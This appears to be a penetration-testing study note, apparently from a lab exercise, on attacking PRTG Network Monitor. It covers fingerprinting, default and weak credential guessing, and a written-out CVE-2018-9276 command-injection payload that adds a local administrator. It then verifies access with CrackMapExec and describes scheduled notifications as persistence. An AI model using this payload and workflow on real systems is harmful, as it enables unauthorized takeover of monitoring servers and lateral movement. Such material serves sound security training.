# PRTG Network Monitor – Discovery and Attacking

## Overview

PRTG Network Monitor is an **agentless network monitoring platform** used to monitor:

- bandwidth usage
- uptime
- device health
- network statistics
- servers, routers, switches, and more

It supports protocols such as:

- ICMP
- SNMP
- WMI
- NetFlow
- REST API integrations

PRTG runs primarily through an **AJAX-based web interface**, though desktop apps are also available.

## Useful context

From the notes:

- first version released in **2003**
- free version released in **2015**
- free version limited to **100 sensors** and roughly **20 hosts**
- used by around **300,000 users worldwide**
- Paessler has built monitoring solutions since **1997**
- organisations using PRTG include:
  - Naples International Airport
  - Virginia Tech
  - 7-Eleven

## Why it matters

PRTG shows up far more often on:

- internal pentests

than on:

- external pentests

It is interesting because it often has:

- broad visibility into the network
- credentials for monitored systems
- privileged service access
- a web console with dangerous functionality

Historically, it has not had a huge number of easily exploitable issues, but one particularly useful flaw is:

- **CVE-2018-9276** – authenticated command injection

Think of PRTG as a monitoring console with deep reach into the environment. If you get admin access, it can quickly become a pivot point.

---

# 1. Discovery / Footprinting

PRTG can often be found on common web ports such as:

- 80
- 443
- 8080

The port is configurable, but **8080** is common in practice.

## Nmap identification

A service scan can fingerprint PRTG quickly.

### Example

```bash
sudo nmap -sV -p- --open -T4 10.129.201.50
```

Example result from the notes:

```text
8080/tcp open  http  Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)
```

## Why this matters

The key fingerprint is:

```text
Indy httpd ... (Paessler PRTG bandwidth monitor)
```

That is usually enough to confirm PRTG.

---

# 2. EyeWitness / Screenshot Discovery

PRTG also stands out very clearly in screenshotting tools such as:

- EyeWitness
- Aquatone

The notes mention that EyeWitness often shows:

- default credentials
- pre-filled login fields

A particularly important default pair is:

```text
prtgadmin : prtgadmin
```

PRTG often exposes this clearly enough that screenshotting tools flag it immediately.

---

# 3. Login Page

Once discovered, browse to the login portal.

## Example

```text
http://10.129.201.50:8080/index.htm
```

At this stage you want to confirm:

- that it is definitely PRTG
- whether default creds work
- whether the version is vulnerable
- whether the instance is internally valuable

---

# 4. Version Fingerprinting

The version can often be extracted directly from the HTML.

## Example

```bash
curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible; MSIE 7.01; Windows NT 5.0)" | grep version
```

Example output from the notes:

```html
<span class="prtgversion">&nbsp;PRTG Network Monitor 17.3.33.2830 </span>
```

## Why this matters

The notes identified the instance as:

- **PRTG 17.3.33.2830**

and therefore likely vulnerable to:

- **CVE-2018-9276**

because that issue affects versions before:

- **18.2.39**

---

# 5. Authentication

The notes show an important real-world pattern:

- default creds may fail
- but weak credentials still work

## Example

Initial attempt failed with:

```text
prtgadmin : prtgadmin
```

But successful login was achieved with:

```text
prtgadmin : Password123
```

## Why this matters

Monitoring tools are often deployed quickly and left with:

- weak passwords
- password policy exceptions
- stale admin accounts
- local-only admin assumptions

Always test:

- default creds
- common weak passwords
- org-pattern passwords where appropriate

---

# 6. High-Value Authenticated Vulnerability – CVE-2018-9276

Once authenticated, the notes go straight to the most valuable flaw:

- **CVE-2018-9276**
- authenticated command injection

## Root cause

When creating a new notification, the **Parameter** field can be passed directly into a PowerShell script without proper sanitisation.

That means an authenticated admin can inject arbitrary commands.

## Why this is useful

It is a practical built-in RCE path that does not depend on:

- memory corruption
- exploit chains
- brittle public PoCs

It is an example of abusing dangerous admin functionality rather than “traditional exploit dev”.

---

# 7. Where the Injection Lives

From the web UI:

- hover **Setup**
- go to **Account Settings**
- then **Notifications**

## Example URL

```text
http://10.129.201.50:8080/myaccount.htm?tabid=2
```

Then:

- click **Add new notification**

Example:

```text
http://10.129.201.50:8080/editnotification.htm?id=new&tabid=1
```

---

# 8. Triggering the Command Injection

The notes describe the exact flow.

## Steps

1. create a new notification
2. give it a name
3. enable **EXECUTE PROGRAM**
4. choose:

```text
Demo exe notification - outfile.ps1
```

5. place your payload into the **Parameter** field
6. save
7. click **Test**

## Example payload from the notes

```text
test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
```

## What this does

- terminates/breaks out of expected parameter handling
- adds a new local user:
  - `prtgadm1`
- adds that user to local administrators

This is noisy but very clear for demonstration.

In a real engagement, you would often prefer something less intrusive, such as:

- reverse shell
- WinRM-enabling only if agreed
- C2 beacon
- short-lived access method

---

# 9. Blind Command Execution

The notes point out that the execution is **blind**.

That means:

- you do not get direct command output in the UI
- successful execution must be inferred another way

## Confirmation options

- check your listener for a reverse shell
- authenticate with the created user
- use SMB/WinRM/RDP validation
- use CrackMapExec
- use Evil-WinRM
- use Impacket tools

---

# 10. Triggering Execution

After saving the malicious notification:

- go back to the notifications list
- click **Test**

You should see a message like:

```text
EXE notification is queued up
```

If you get an error, re-check:

- notification type
- selected program
- parameter field
- save status

Once queued, the command should execute on the host.

---

# 11. Verifying Code Execution / Privilege

The notes used CrackMapExec to validate the newly created admin account.

## Example

```bash
sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG!
```

## Result

```text
[+] APP03\prtgadm1:Pwn3d_by_PRTG! (Pwn3d!)
```

That confirms:

- the command executed successfully
- a local admin user was created
- the account has administrative rights

At that point, you can pivot into normal post-exploitation access methods.

---

# 12. Alternative Follow-Up Access

The notes mention several likely next steps after code execution / user creation:

- RDP
- WinRM
- Evil-WinRM
- `wmiexec.py`
- `psexec.py`

## Why this matters

PRTG often sits on Windows hosts with broad reach, so a local admin foothold can become:

- host compromise
- credential access
- internal enumeration
- lateral movement

---

# 13. Scheduling as Persistence

The notes make a very useful operational point:

Notifications in PRTG can be scheduled.

That means a malicious notification could potentially be configured to:

- execute later
- run daily
- re-establish access periodically

## Why this matters

This could act as a persistence mechanism during a long engagement.

From a defender perspective, it also means:

- notification review matters
- execution-capable notifications are dangerous
- configuration changes should be audited

---

# 14. Practical Workflow

## Step 1 – identify PRTG

Use:

- Nmap
- EyeWitness/Aquatone
- browser confirmation

Key fingerprint:

```text
Paessler PRTG bandwidth monitor
```

## Step 2 – confirm version

Use the login page HTML.

Example:

```bash
curl -s http://<TARGET>:8080/index.htm | grep version
```

## Step 3 – test creds

Try:

- `prtgadmin:prtgadmin`
- weak/common passwords

Example successful pair from the notes:

```text
prtgadmin : Password123
```

## Step 4 – check vulnerability applicability

If version is before:

```text
18.2.39
```

consider:

- **CVE-2018-9276**

## Step 5 – create malicious notification

Go to:

- Setup
- Account Settings
- Notifications
- Add new notification

Select:

```text
Demo exe notification - outfile.ps1
```

Add payload to **Parameter**.

## Step 6 – trigger with Test

Click **Test** to queue execution.

## Step 7 – verify impact

Use:

- listener
- CrackMapExec
- WinRM
- RDP
- Impacket tools

---

# 15. Useful URLs

## Login page

```text
http://10.129.201.50:8080/index.htm
```

## Notifications

```text
http://10.129.201.50:8080/myaccount.htm?tabid=2
```

## New notification

```text
http://10.129.201.50:8080/editnotification.htm?id=new&tabid=1
```

---

# 16. Useful Commands

## Nmap fingerprinting

```bash
sudo nmap -sV -p- --open -T4 10.129.201.50
```

## Version extraction

```bash
curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible; MSIE 7.01; Windows NT 5.0)" | grep version
```

## Validate admin access via SMB

```bash
sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG!
```

---

# 17. Practical Notes

## What makes PRTG especially useful

- often deployed on Windows
- often sees the whole environment
- may store monitoring creds
- may run with broad permissions
- vulnerable versions allow a very practical authenticated injection path

## Preferred payload style in real assessments

The notes used local-user creation for clarity, but in real work you may prefer:

- reverse shell
- staged PowerShell
- C2 agent
- minimally invasive proof-of-execution

because they avoid making lasting changes.

---

# 18. Key Takeaways

- PRTG is common on internal networks and easy to fingerprint
- default and weak creds are worth testing immediately
- version disclosure via HTML makes vuln triage straightforward
- **CVE-2018-9276** is a highly practical authenticated command injection
- the injection is blind, so you must verify success indirectly
- once compromised, PRTG can provide a strong foothold into the wider environment
- notification scheduling can potentially be abused for persistence

---

# Tags

#prtg
#network-monitoring
#paessler
#cve-2018-9276
#command-injection
#windows
#crackmapexec
#attacking-common-apps
#pentesting
#ctf
#obsidian